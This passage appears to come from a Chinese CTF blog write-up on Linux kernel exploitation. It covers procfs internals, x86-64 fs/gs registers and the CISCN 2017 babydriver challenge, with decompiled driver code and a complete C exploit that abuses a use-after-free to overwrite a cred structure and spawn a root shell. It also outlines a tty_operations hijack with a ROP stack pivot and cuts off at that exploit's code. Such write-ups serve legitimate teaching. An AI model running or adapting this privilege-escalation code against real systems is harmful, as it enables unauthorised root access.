refcnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">pde_openers</span>;</span><span class="comment">/* who did -&gt;open, but not -&gt;release */</span></span><br><span class="line"><span class="comment">/* protects -&gt;pde_openers and all struct pde_opener instances */</span></span><br><span class="line"><span class="type">spinlock_t</span> pde_unload_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">pde_unload_completion</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> *<span class="title">proc_iops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> *<span class="title">proc_ops</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_dir_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">proc_dops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">seq_ops</span>;</span></span><br><span class="line"><span class="type">int</span> (*single_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">proc_write_t</span> write;</span><br><span class="line"><span class="type">void</span> *data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> state_size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> low_ino;</span><br><span class="line"><span class="type">nlink_t</span> nlink;</span><br><span class="line"><span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="type">kgid_t</span> gid;</span><br><span class="line"><span class="type">loff_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">subdir</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">subdir_node</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">umode_t</span> mode;</span><br><span class="line">u8 flags;</span><br><span class="line">u8 namelen;</span><br><span class="line"><span class="type">char</span> inline_name[];</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><hr><p>继续跟进<code>proc_create_data</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_data</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">p = proc_create_reg(name, mode, &amp;parent, data);</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;proc_ops = proc_ops;</span><br><span class="line">pde_set_flags(p);</span><br><span class="line"><span class="keyword">return</span> proc_register(parent, p);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create_data);</span><br></pre></td></tr></table></figure><p>其中<code>proc_create_reg</code>的主要功能是创建并返回一个<code>proc_dir_entry</code>结构体指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_reg</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry **parent, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IFMT) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IFREG;</span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IALLUGO) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IRUGO;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!S_ISREG(mode)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p = __proc_create(parent, name, mode, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">p-&gt;proc_iops = &amp;proc_file_inode_operations;</span><br><span class="line">p-&gt;data = data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后设置p-&gt;proc_ops = proc_ops;相当于完成注册函数</p><p>再返回函数proc_register进行注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* returns the registered entry, or frees dp and returns NULL on failure */</span></span><br><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_register</span><span class="params">(<span class="keyword">struct</span> proc_dir_entry *dir,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *dp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (proc_alloc_inum(&amp;dp-&gt;low_ino))</span><br><span class="line"><span class="keyword">goto</span> out_free_entry;</span><br><span class="line"></span><br><span class="line">write_lock(&amp;proc_subdir_lock);</span><br><span class="line">dp-&gt;parent = dir;</span><br><span class="line"><span class="keyword">if</span> (pde_subdir_insert(dir, dp) == <span class="literal">false</span>) &#123;</span><br><span class="line">WARN(<span class="number">1</span>, <span class="string">&quot;proc_dir_entry &#x27;%s/%s&#x27; already registered\n&quot;</span>,</span><br><span class="line">     dir-&gt;name, dp-&gt;name);</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"><span class="keyword">goto</span> out_free_inum;</span><br><span class="line">&#125;</span><br><span class="line">dir-&gt;nlink++;</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dp;</span><br><span class="line">out_free_inum:</span><br><span class="line">proc_free_inum(dp-&gt;low_ino);</span><br><span class="line">out_free_entry:</span><br><span class="line">pde_free(dp);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更细的暂且不做分析</p><h2 id="延拓2"><a href="#延拓2" class="headerlink" title="延拓2"></a>延拓2</h2><p>​    Intel处理器实现了6个段寄存器，用来方便程序设计者对程序的代码、数据和栈进行分段和引用.</p><p>通常来说</p><ol><li>代码段用cs寄存器来分段和引用</li><li>数据段用ds寄存器来分段和引用</li><li>栈段用ss寄存器来分段和引用</li><li>另外3个段寄存器es、fs和gs可以用来分段和引用额外的数据段。</li></ol><p>​    在程序执行代码段里的代码、或访问数据段中的数据之前，需要事先将合法的16位段选择符的值加载到适当的段寄存器中，否则无法执行代码或访问数据。因此，虽然一个程序可以有很多段，但是某一时刻最多可以同时使用的只有其中的6个。要引用其他段，就要先加载对应的段选择符到适当的段寄存器中。</p><p>​    每个段寄存器都包含两个部分：对开发者可见的部分和不可见的隐藏部分。每当向一个段寄存器中加载段选择符的时候，处理器会自动将段选择符指向的段描述符中的基地址、限长和一些属性信息加载到段寄存器中的隐藏部分。</p><p>​    如果系统软件对某个段描述符进行了修改，那么系统软件也有责任重新加载对应的段寄存器，以确保对段描述符所做的修改能够生效（尤其是隐藏部分）。如果系统软件不重载段寄存器，那么缓存在段寄存器中隐藏部分的旧信息还会被继续使用。但从另一个角度来讲，只要不重载段寄存器，段寄存器的隐藏部分的内容就不会发生变化，在进行处理器模式切换的时候，比如从实模式切换到保护模式时之所以能够顺利执行，也是得益于这一原理。</p><h3 id="x86-64处理器模式下的段寄存器"><a href="#x86-64处理器模式下的段寄存器" class="headerlink" title="x86-64处理器模式下的段寄存器"></a>x86-64处理器模式下的段寄存器</h3><p>​    Intel理解到了现代操作系统设计者的想法，于是在x86-64处理器模式中，在微架构层将分段单元中的绝大多数功能都绕开了（注意不是关闭了分段单元）。</p><p>​    具体来说，在加载cs、ds、es和ss寄存器时，对应的段描述符中的基地址，限长和部分属性字段一概被忽略，并假设基地址总为0，限长总为2^64-1。同样在使用ds、es和ss段前缀的时候，也都做出同样的假设；同时，这些段寄存器中隐藏部分中与上述对应的字段也被忽略。因此x86-64处理器模式只支持平坦内存模型，即从0开始到2^48-1结束的规范化的虚拟地址空间，这是x86-64处理器模式中所做的硬性规定，因为这些规定可以进一步加快逻辑地址到虚拟地址的转换效率。</p><h3 id="x86-64处理器模式下的fs-gs段寄存器"><a href="#x86-64处理器模式下的fs-gs段寄存器" class="headerlink" title="x86-64处理器模式下的fs/gs段寄存器"></a>x86-64处理器模式下的fs/gs段寄存器</h3><p>​    虽说分段单元在x86-64处理器模式中绝大多数的情况下都被绕过了，但少数情况下不会绕过，就比如fs和gs段寄存器</p><p>​    但是64位处理器模式下的分段单元的微架构逻辑还是有些新的“猫腻”，具体做法是：获取fs和gs寄存器中隐藏部分的x86-64基地址（后文简写为fs.base和gs.base）的方式不再是通过fs和gs寄存器所指向的GDT/IDT中的段描述符来指定，而是在物理上就将fs和gs寄存器中隐藏部分中的64位基地址直接在物理上映射到了IA32_FS_BASE MSR（复位值为0）和IA32_GS_BASE MSR（复位值为0）这两个MSR上（或者说IA32_FS_BASE MSR和IA32_GS_BASE MSR分别是fs.base和gs.base的别名）。系统软件可以事先对这两个MSR进行编程，以便软件能够用fs和gs寄存器对特殊的数据进行引用。</p><p>具体来说，现代Linux x86-64下的fs/gs段寄存器的用途分别为：</p><ul><li><strong>用户态使用fs寄存器引用线程的glibc TLS和线程在用户态的stack canary；用户态的glibc不使用gs寄存器；应用可以自行决定是否使用该寄存器</strong></li><li><strong>内核态使用gs寄存器引用percpu变量和进程在内核态的stack canary；内核态不使用fs寄存器。</strong></li></ul><h2 id="模块地址获取"><a href="#模块地址获取" class="headerlink" title="模块地址获取"></a>模块地址获取</h2><ul><li>cat /proc/modules </li><li>cat /proc/devices </li><li>cat /proc/kallsyms </li><li>lsmod </li><li>dmesg</li></ul><h1 id="CISCN-2017-babydriver"><a href="#CISCN-2017-babydriver" class="headerlink" title="CISCN 2017 babydriver"></a>CISCN 2017 babydriver</h1><h2 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h2><p>看一下boot.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   │ File: ../boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/bash</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev</span><br><span class="line">       │ /ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores</span><br><span class="line">       │ =1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>看到开启了smep保护</p><p>再看init</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │  </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t sysfs none /sys</span><br><span class="line">   5   │ mount -t devtmpfs devtmpfs /dev</span><br><span class="line">   6   │ chown root:root flag</span><br><span class="line">   7   │ chmod 400 flag</span><br><span class="line">   8   │ exec 0&lt;/dev/console</span><br><span class="line">   9   │ exec 1&gt;/dev/console</span><br><span class="line">  10   │ exec 2&gt;/dev/console</span><br><span class="line">  11   │ </span><br><span class="line">  12   │ insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">  13   │ chmod 777 /dev/babydev</span><br><span class="line">  14   │ echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">  15   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ umount /proc</span><br><span class="line">  18   │ umount /sys</span><br><span class="line">  19   │ poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>其中insmod加载了babydriver.ko驱动</p><h2 id="模块分析-1"><a href="#模块分析-1" class="headerlink" title="模块分析"></a>模块分析</h2><p>checksec</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/babydriver/babydriver.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>几乎没有保护</p><p>根据fops结构体可以知道驱动提供的外部接口对应如下</p><ul><li>open =&gt; babyopen</li><li>read =&gt; babyread</li><li>write =&gt; babywrite</li><li>ioctl =&gt; babyioctl</li><li>free =&gt; babyrelease</li></ul><p><strong>babyioctl:</strong> 定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyopen:</strong> 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyread:</strong> 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babywrite:</strong> 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyrelease:</strong> 释放空间，没什么好说的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h3><p>本题fops结构体,ida显示并未注册babyrelease函数,但真正做题的时候发现是注册了的</p><p>一开始很困惑,以为是什么特殊的机制,最后发现babyrelease的函数位置就是0</p><p>也就是说本来是注册了的,但是因为值刚好是0,ida看不出来,才显示未注册</p><p>并且更进一步可以得到,所有未注册的函数最终都默认注册babyrelease因为未注册就显示NULL,而babyrelease就是null(0)</p><p>不过也仅限这题了</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>观察到babyrelease函数只是free,并没有置零且存储chunk的指针是全局变量</p><p>如果我们同时打开两个babydev设备文件</p><p>并将其中一个释放那么就可以uaf了,那如何利用这个uaf</p><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a><strong>思路1</strong></h3><p><strong>此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><p>但在本题版本可以分配到刚才释放的chunk</p><p>因此可以伪造cred结构体,修改权限</p><p>并fork一个程序</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> device1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> device2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">ioctl(device1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">close(device1);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> new_process_pid = fork();</span><br><span class="line"><span class="keyword">if</span> (new_process_pid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (new_process_pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> lots_zero[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(device2, lots_zero, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] got root&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(device2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>同样是利用uaf</p><p>不过这次利用的是在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code>。</p><p>tty_struct的size是0x2e0</p><p>利用uaf我们可以劫持其中的tty_operations函数指针</p><p>那么在我们对这个设备进行相应操作（如 write、ioctl）时便会执行我们布置好的恶意函数指针。</p><p>由于没有开启 SMAP 保护，故我们可以在用户态进程的栈上布置 ROP 链与 <code>fake tty_operations</code> 结构体。</p><p>使用 gdb 进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持 <code>tty_operaionts</code> 结构体到用户态的栈上，并选择任意一条内核 gadget 作为 fake tty 函数指针以方便下断点：</p><p>这段调试可能有点难理解,即劫持tty_ops的函数表为内核上的任意可区分代码,这样我们在调试时可以在对应的位置下断点,以观察当前的上下文环境</p><p>我们不难观察到，在我们调用<code>tty_operations-&gt;write</code>时，<strong>其 rax 寄存器中存放的便是 tty_operations 结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的 gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头。</p><p>使用 ROPgadget 查找相关 gadget，发现有两条符合我们要求的 gadget：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget.png" alt="image.png"></p><p>gdb 调试，发现第一条 gadget 其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget2.png" alt="image.png"></p><p>那么利用这条 gadget 我们便可以很好地完成栈迁移的过程，执行我们所构造的 ROP 链。</p><p>而<code>tty_operations</code>结构体开头到其 write 指针间的空间较小,直接在此处rop显然是行不通的(与write指针冲突)，因此我们还需要进行二次栈迁移，这里随便选一条改 rax 的 gadget 即可：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget3.png" alt="image.png"></p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 